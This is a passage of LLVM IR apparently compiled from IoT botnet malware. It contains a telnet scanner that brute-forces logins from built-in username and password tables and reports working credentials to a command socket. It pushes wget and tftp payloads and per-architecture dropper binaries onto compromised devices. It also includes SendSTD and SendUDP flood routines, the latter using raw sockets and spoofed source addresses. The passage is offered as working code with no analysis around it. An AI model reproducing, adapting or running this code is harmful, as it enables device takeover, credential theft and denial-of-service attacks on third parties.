  %216 = load i8*, i8** %204, align 8
  %217 = call i32 @contains_success(i8* %216)
  %218 = icmp eq i32 %217, 0
  br i1 %218, label %238, label %219

; <label>:219:                                    ; preds = %215
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 3
  %221 = load i8, i8* %220, align 1
  %222 = icmp eq i8 %221, 2
  br i1 %222, label %223, label %224

; <label>:223:                                    ; preds = %219
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 7)
  br label %480

; <label>:224:                                    ; preds = %219
  %225 = load i32, i32* @mainCommSock, align 4
  %226 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %44)
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 4
  %228 = load i8, i8* %227, align 2
  %229 = zext i8 %228 to i64
  %230 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %229
  %231 = load i8*, i8** %230, align 8
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 5
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i64
  %235 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %234
  %236 = load i8*, i8** %235, align 8
  %237 = call i32 (i32, i8*, ...) @sockprintf(i32 %225, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.277, i64 0, i64 0), i8* %226, i8* %231, i8* %236)
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 7)
  br label %480

; <label>:238:                                    ; preds = %215
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:239:                                    ; preds = %201
  %240 = load i32, i32* %45, align 16
  %241 = add i32 %240, 7
  %242 = zext i32 %241 to i64
  %243 = call i64 @time(i64* null) #7
  %244 = icmp slt i64 %242, %243
  br i1 %244, label %245, label %480

; <label>:245:                                    ; preds = %239
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:246:                                    ; preds = %51
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %248 = load i32, i32* %247, align 16
  %249 = call i32 (i32, i8*, ...) @sockprintf(i32 %248, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.278, i64 0, i64 0))
  %250 = icmp slt i32 %249, 0
  br i1 %250, label %251, label %252

; <label>:251:                                    ; preds = %246
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:252:                                    ; preds = %246
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 8)
  br label %480

; <label>:253:                                    ; preds = %.preheader
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %254

; <label>:254:                                    ; preds = %.preheader, %253
  %255 = load i32, i32* %54, align 16
  %256 = load i8*, i8** getelementptr inbounds ([6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 1), align 8
  %257 = call i32 (i32, i8*, ...) @sockprintf(i32 %255, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.279, i64 0, i64 0), i8* %256, i8* %256)
  %258 = icmp slt i32 %257, 0
  br i1 %258, label %483, label %484

; <label>:259:                                    ; preds = %51
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %261 = load i32, i32* %260, align 16
  %262 = call i32 (i32, i8*, ...) @sockprintf(i32 %261, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.280, i64 0, i64 0))
  %263 = icmp slt i32 %262, 0
  br i1 %263, label %264, label %265

; <label>:264:                                    ; preds = %259
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:265:                                    ; preds = %259
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 10)
  br label %480

; <label>:266:                                    ; preds = %51
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %268 = load i32, i32* %267, align 16
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 9
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @read_until_response(i32 %268, i32 %0, i8* %270, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @archs, i64 0, i64 0))
  %272 = icmp eq i32 %271, 0
  br i1 %272, label %480, label %273

; <label>:273:                                    ; preds = %266
  %274 = load i8*, i8** %269, align 8
  %275 = call i32 @contains_string(i8* %274, i8** undef)
  %276 = icmp eq i32 %275, 0
  br i1 %276, label %278, label %277

; <label>:277:                                    ; preds = %273
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 11)
  br label %480

; <label>:278:                                    ; preds = %273
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 0)
  br label %480

; <label>:279:                                    ; preds = %51
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %281 = load i32, i32* %280, align 16
  %282 = call i32 (i32, i8*, ...) @sockprintf(i32 %281, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.282, i64 0, i64 0))
  %283 = icmp slt i32 %282, 0
  br i1 %283, label %284, label %285

; <label>:284:                                    ; preds = %279
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:285:                                    ; preds = %279
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 12)
  br label %480

; <label>:286:                                    ; preds = %51
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %288 = load i32, i32* %287, align 16
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 9
  %290 = load i8*, i8** %289, align 8
  %291 = call i32 @read_until_response(i32 %288, i32 %0, i8* %290, i32 1024, i8** getelementptr inbounds ([3 x i8*], [3 x i8*]* @checkmethod, i64 0, i64 0))
  %292 = icmp eq i32 %291, 0
  br i1 %292, label %480, label %293

; <label>:293:                                    ; preds = %286
  %294 = load i8*, i8** %289, align 8
  %295 = call i32 @contains_string(i8* %294, i8** undef)
  %296 = icmp eq i32 %295, 0
  br i1 %296, label %298, label %297

; <label>:297:                                    ; preds = %293
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 13)
  br label %480

; <label>:298:                                    ; preds = %293
  %299 = load i8*, i8** %289, align 8
  %300 = call i32 @contains_string(i8* %299, i8** undef)
  %301 = icmp eq i32 %300, 0
  br i1 %301, label %303, label %302

; <label>:302:                                    ; preds = %298
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 14)
  br label %480

; <label>:303:                                    ; preds = %298
  %304 = load i8*, i8** %289, align 8
  %305 = call i32 @contains_string(i8* %304, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @echo, i64 0, i64 0))
  %306 = icmp eq i32 %305, 0
  br i1 %306, label %308, label %307

; <label>:307:                                    ; preds = %303
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 15)
  br label %480

; <label>:308:                                    ; preds = %303
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 0)
  br label %480

; <label>:309:                                    ; preds = %51
  %310 = load i32, i32* @mainCommSock, align 4
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 1
  %312 = load i32, i32* %311, align 4
  %313 = call i8* @inet_ntoa(i32 %312) #7
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 4
  %315 = load i8, i8* %314, align 2
  %316 = zext i8 %315 to i64
  %317 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %316
  %318 = load i8*, i8** %317, align 8
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 5
  %320 = load i8, i8* %319, align 1
  %321 = zext i8 %320 to i64
  %322 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %321
  %323 = load i8*, i8** %322, align 8
  %324 = call i32 (i32, i8*, ...) @sockprintf(i32 %310, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.284, i64 0, i64 0), i8* %313, i8* %318, i8* %323)
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %326 = load i32, i32* %325, align 16
  %327 = load i8*, i8** @wgetpayload, align 8
  %328 = call i64 @strlen(i8* %327) #14
  %329 = call i64 @send(i32 %326, i8* %327, i64 %328, i32 16384) #7
  %330 = icmp slt i64 %329, 0
  br i1 %330, label %331, label %332

; <label>:331:                                    ; preds = %309
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:332:                                    ; preds = %309
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 16)
  br label %480

; <label>:333:                                    ; preds = %51
  %334 = load i32, i32* @mainCommSock, align 4
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 1
  %336 = load i32, i32* %335, align 4
  %337 = call i8* @inet_ntoa(i32 %336) #7
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 4
  %339 = load i8, i8* %338, align 2
  %340 = zext i8 %339 to i64
  %341 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %340
  %342 = load i8*, i8** %341, align 8
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 5
  %344 = load i8, i8* %343, align 1
  %345 = zext i8 %344 to i64
  %346 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %345
  %347 = load i8*, i8** %346, align 8
  %348 = call i32 (i32, i8*, ...) @sockprintf(i32 %334, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.285, i64 0, i64 0), i8* %337, i8* %342, i8* %347)
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %350 = load i32, i32* %349, align 16
  %351 = load i8*, i8** @tftppayload, align 8
  %352 = call i64 @strlen(i8* %351) #14
  %353 = call i64 @send(i32 %350, i8* %351, i64 %352, i32 16384) #7
  %354 = icmp slt i64 %353, 0
  br i1 %354, label %355, label %356

; <label>:355:                                    ; preds = %333
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:356:                                    ; preds = %333
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 16)
  br label %480

; <label>:357:                                    ; preds = %51
  %358 = load i32, i32* @mainCommSock, align 4
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 1
  %360 = load i32, i32* %359, align 4
  %361 = call i8* @inet_ntoa(i32 %360) #7
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 4
  %363 = load i8, i8* %362, align 2
  %364 = zext i8 %363 to i64
  %365 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %364
  %366 = load i8*, i8** %365, align 8
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 5
  %368 = load i8, i8* %367, align 1
  %369 = zext i8 %368 to i64
  %370 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %369
  %371 = load i8*, i8** %370, align 8
  %372 = call i32 (i32, i8*, ...) @sockprintf(i32 %358, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.286, i64 0, i64 0), i8* %361, i8* %366, i8* %371)
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 0, i32 0
  %374 = ptrtoint %struct.telstate_t* %44 to i64
  %375 = trunc i64 %374 to i32
  %376 = load i32, i32* %373, align 16
  %377 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_mips, i64 0, i64 0), align 16
  %378 = call i32 (i32, i8*, ...) @sockprintf(i32 %376, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %377)
  %379 = icmp slt i32 %378, 0
  br i1 %379, label %380, label %381

; <label>:380:                                    ; preds = %357
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:381:                                    ; preds = %357
  %382 = load i32, i32* %373, align 16
  %383 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_mipsel, i64 0, i64 0), align 16
  %384 = call i32 (i32, i8*, ...) @sockprintf(i32 %382, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %383)
  %385 = icmp slt i32 %384, 0
  br i1 %385, label %386, label %387

; <label>:386:                                    ; preds = %381
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:387:                                    ; preds = %381
  %388 = load i32, i32* %373, align 16
  %389 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_sh4, i64 0, i64 0), align 16
  %390 = call i32 (i32, i8*, ...) @sockprintf(i32 %388, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %389)
  %391 = icmp slt i32 %390, 0
  br i1 %391, label %392, label %393

; <label>:392:                                    ; preds = %387
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:393:                                    ; preds = %387
  %394 = load i32, i32* %373, align 16
  %395 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_x86_64, i64 0, i64 0), align 16
  %396 = call i32 (i32, i8*, ...) @sockprintf(i32 %394, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %395)
  %397 = icmp slt i32 %396, 0
  br i1 %397, label %398, label %399

; <label>:398:                                    ; preds = %393
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:399:                                    ; preds = %393
  %400 = load i32, i32* %373, align 16
  %401 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_armv6l, i64 0, i64 0), align 16
  %402 = call i32 (i32, i8*, ...) @sockprintf(i32 %400, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %401)
  %403 = icmp slt i32 %402, 0
  br i1 %403, label %404, label %405

; <label>:404:                                    ; preds = %399
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:405:                                    ; preds = %399
  %406 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_i686, i64 0, i64 0), align 16
  %407 = call i32 (i32, i8*, ...) @sockprintf(i32 %375, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %406)
  %408 = icmp slt i32 %407, 0
  br i1 %408, label %409, label %410

; <label>:409:                                    ; preds = %405
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:410:                                    ; preds = %405
  %411 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_powerpc, i64 0, i64 0), align 16
  %412 = call i32 (i32, i8*, ...) @sockprintf(i32 %375, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %411)
  %413 = icmp slt i32 %412, 0
  br i1 %413, label %414, label %415

; <label>:414:                                    ; preds = %410
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:415:                                    ; preds = %410
  %416 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_i586, i64 0, i64 0), align 16
  %417 = call i32 (i32, i8*, ...) @sockprintf(i32 %375, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %416)
  %418 = icmp slt i32 %417, 0
  br i1 %418, label %419, label %420

; <label>:419:                                    ; preds = %415
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:420:                                    ; preds = %415
  %421 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_m68k, i64 0, i64 0), align 16
  %422 = call i32 (i32, i8*, ...) @sockprintf(i32 %375, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %421)
  %423 = icmp slt i32 %422, 0
  br i1 %423, label %424, label %425

; <label>:424:                                    ; preds = %420
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:425:                                    ; preds = %420
  %426 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_sparc, i64 0, i64 0), align 16
  %427 = call i32 (i32, i8*, ...) @sockprintf(i32 %375, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %426)
  %428 = icmp slt i32 %427, 0
  br i1 %428, label %429, label %430

; <label>:429:                                    ; preds = %425
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:430:                                    ; preds = %425
  %431 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_armv4l, i64 0, i64 0), align 16
  %432 = call i32 (i32, i8*, ...) @sockprintf(i32 %375, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %431)
  %433 = icmp slt i32 %432, 0
  br i1 %433, label %434, label %435

; <label>:434:                                    ; preds = %430
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:435:                                    ; preds = %430
  %436 = load i32, i32* %373, align 16
  %437 = load i8*, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @dropper_armv5l, i64 0, i64 0), align 16
  %438 = call i32 (i32, i8*, ...) @sockprintf(i32 %436, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i8* %437)
  %439 = icmp slt i32 %438, 0
  br i1 %439, label %440, label %441

; <label>:440:                                    ; preds = %435
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:441:                                    ; preds = %435
  %442 = load i32, i32* %373, align 16
  %443 = load i8*, i8** @dropper_powerpc440fp, align 8
  %444 = load i8, i8* %443, align 1
  %445 = sext i8 %444 to i32
  %446 = call i32 (i32, i8*, ...) @sockprintf(i32 %442, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i64 0, i64 0), i32 %445)
  %447 = icmp slt i32 %446, 0
  br i1 %447, label %448, label %449

; <label>:448:                                    ; preds = %441
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %463

; <label>:449:                                    ; preds = %441
  %450 = load i32, i32* @mainCommSock, align 4
  %451 = load i32, i32* %359, align 4
  %452 = call i8* @inet_ntoa(i32 %451) #7
  %453 = load i8, i8* %362, align 2
  %454 = zext i8 %453 to i64
  %455 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %454
  %456 = load i8*, i8** %455, align 8
  %457 = load i8, i8* %367, align 1
  %458 = zext i8 %457 to i64
  %459 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %458
  %460 = load i8*, i8** %459, align 8
  %461 = call i32 (i32, i8*, ...) @sockprintf(i32 %450, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.288, i64 0, i64 0), i8* %452, i8* %456, i8* %460)
  %462 = call i32 @sleep(i32 1) #7
  br label %463

; <label>:463:                                    ; preds = %380, %386, %392, %398, %404, %409, %414, %419, %424, %429, %434, %440, %448, %449
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 16)
  br label %480

; <label>:464:                                    ; preds = %51
  %465 = load i32, i32* @mainCommSock, align 4
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 1
  %467 = load i32, i32* %466, align 4
  %468 = call i8* @inet_ntoa(i32 %467) #7
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 4
  %470 = load i8, i8* %469, align 2
  %471 = zext i8 %470 to i64
  %472 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %471
  %473 = load i8*, i8** %472, align 8
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %43, i32 5
  %475 = load i8, i8* %474, align 1
  %476 = zext i8 %475 to i64
  %477 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %476
  %478 = load i8*, i8** %477, align 8
  %479 = call i32 (i32, i8*, ...) @sockprintf(i32 %465, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.289, i64 0, i64 0), i8* %468, i8* %473, i8* %478)
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %480

; <label>:480:                                    ; preds = %266, %286, %51, %166, %200, %252, %502, %265, %285, %332, %356, %463, %464, %99, %98, %132, %126, %154, %148, %188, %182, %245, %239, %277, %278, %297, %307, %308, %302, %214, %223, %224, %238, %180, %181, %146, %147, %119, %120, %81, %355, %331, %284, %264, %251, %199, %165, %125, %80, %77
  %481 = add nsw i32 %.1172, 1
  %482 = icmp slt i32 %481, %.
  %.mux = select i1 %482, i32 %481, i32 0
  br label %.lr.ph

; <label>:483:                                    ; preds = %254
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %484

; <label>:484:                                    ; preds = %483, %254
  %485 = load i32, i32* %54, align 16
  %486 = load i8*, i8** getelementptr inbounds ([6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 2), align 16
  %487 = call i32 (i32, i8*, ...) @sockprintf(i32 %485, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.279, i64 0, i64 0), i8* %486, i8* %486)
  %488 = icmp slt i32 %487, 0
  br i1 %488, label %489, label %490

; <label>:489:                                    ; preds = %484
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %490

; <label>:490:                                    ; preds = %489, %484
  %491 = load i32, i32* %54, align 16
  %492 = load i8*, i8** getelementptr inbounds ([6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 3), align 8
  %493 = call i32 (i32, i8*, ...) @sockprintf(i32 %491, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.279, i64 0, i64 0), i8* %492, i8* %492)
  %494 = icmp slt i32 %493, 0
  br i1 %494, label %495, label %496

; <label>:495:                                    ; preds = %490
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %496

; <label>:496:                                    ; preds = %495, %490
  %497 = load i32, i32* %54, align 16
  %498 = load i8*, i8** getelementptr inbounds ([6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 4), align 16
  %499 = call i32 (i32, i8*, ...) @sockprintf(i32 %497, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.279, i64 0, i64 0), i8* %498, i8* %498)
  %500 = icmp slt i32 %499, 0
  br i1 %500, label %501, label %502

; <label>:501:                                    ; preds = %496
  call void @reset_telstate(%struct.telstate_t* nonnull %44)
  br label %502

; <label>:502:                                    ; preds = %501, %496
  call void @advance_telstate(%struct.telstate_t* nonnull %44, i32 9)
  br label %480
}

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #2

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define void @SendSTD(i8*, i32, i32) local_unnamed_addr #11 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #7
  %6 = tail call i64 @time(i64* null) #7
  %7 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %8 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 16, i32 4, i1 false)
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #7
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 2
  %18 = load i32, i32* %17, align 8
  %19 = trunc i32 %18 to i16
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %19, i16* %20, align 4
  %21 = trunc i32 %1 to i16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %24 = sext i32 %2 to i64
  %25 = add nsw i64 %6, %24
  br label %26

; <label>:26:                                     ; preds = %35, %3
  %.0 = phi i32 [ 0, %3 ], [ %36, %35 ]
  %27 = icmp ugt i32 %.0, 49
  br i1 %27, label %28, label %35

; <label>:28:                                     ; preds = %26
  %29 = call i64 @send(i32 %5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.290, i64 0, i64 0), i64 69, i32 0) #7
  %30 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %23, i32 16) #7
  %31 = call i64 @time(i64* null) #7
  %32 = icmp slt i64 %31, %25
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %28
  %34 = call i32 @close(i32 %5) #7
  call void @_exit(i32 0) #16
  unreachable

; <label>:35:                                     ; preds = %28, %26
  %.1 = phi i32 [ %.0, %26 ], [ 0, %28 ]
  %36 = add i32 %.1, 1
  br label %26
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #2

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #12

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %127

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %127, label %27

; <label>:27:                                     ; preds = %22
  store i32 1, i32* %8, align 4
  %28 = bitcast i32* %8 to i8*
  %29 = call i32 @setsockopt(i32 %25, i32 0, i32 3, i8* nonnull %28, i32 4) #7
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %127, label %.preheader.preheader

.preheader.preheader:                             ; preds = %27
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.04041 = phi i32 [ %31, %.preheader ], [ 50, %.preheader.preheader ]
  %31 = add nsw i32 %.04041, -1
  %32 = call i64 @time(i64* null) #7
  %33 = call i32 @rand_cmwc()
  %34 = zext i32 %33 to i64
  %35 = xor i64 %34, %32
  %36 = trunc i64 %35 to i32
  call void @srand(i32 %36) #7
  %37 = call i32 @rand() #7
  call void @init_rand(i32 %37)
  %38 = icmp eq i32 %31, 0
  br i1 %38, label %39, label %.preheader

; <label>:39:                                     ; preds = %.preheader
  %40 = sub nsw i32 32, %5
  %41 = shl i32 -1, %40
  %42 = sext i32 %3 to i64
  %43 = add nsw i64 %42, 28
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %49 = load i32, i32* %48, align 4
  %50 = call i32 @getRandomIP(i32 %41)
  %51 = call i32 @htonl(i32 %50) #15
  %52 = add nsw i64 %42, 8
  %53 = trunc i64 %52 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %49, i32 %51, i8 zeroext 17, i32 %53)
  %54 = trunc i64 %52 to i16
  %55 = call zeroext i16 @htons(i16 zeroext %54) #15
  %56 = getelementptr inbounds i8, i8* %45, i64 24
  %57 = bitcast i8* %56 to i16*
  store i16 %55, i16* %57, align 8
  %58 = call i32 @rand_cmwc()
  %59 = trunc i32 %58 to i16
  %60 = bitcast i8* %47 to i16*
  store i16 %59, i16* %60, align 4
  br i1 %10, label %61, label %63

; <label>:61:                                     ; preds = %39
  %62 = call i32 @rand_cmwc()
  br label %67

